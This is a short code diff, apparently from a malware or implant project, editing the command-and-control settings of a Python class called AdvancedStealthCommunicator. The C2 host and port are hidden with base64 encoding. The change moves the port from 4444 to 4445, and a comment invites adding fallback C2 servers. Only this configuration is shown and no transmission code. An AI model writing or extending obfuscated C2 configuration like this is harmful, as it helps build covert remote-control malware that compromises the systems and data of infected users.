@@ -23,7 +23,7 @@ class AdvancedStealthCommunicator:
         self.C2_CONFIGS = [
             {
                 'host': base64.b64decode(b"MTkyLjE2OC4xLjE2Nw==").decode(),
-                'port': int(base64.b64decode(b"NDQ0NA==").decode()),
+                'port': int(base64.b64decode(b"NDQ0NQ==").decode()),
                 'active': True
             },
             # Fallback C2 servers can be added here
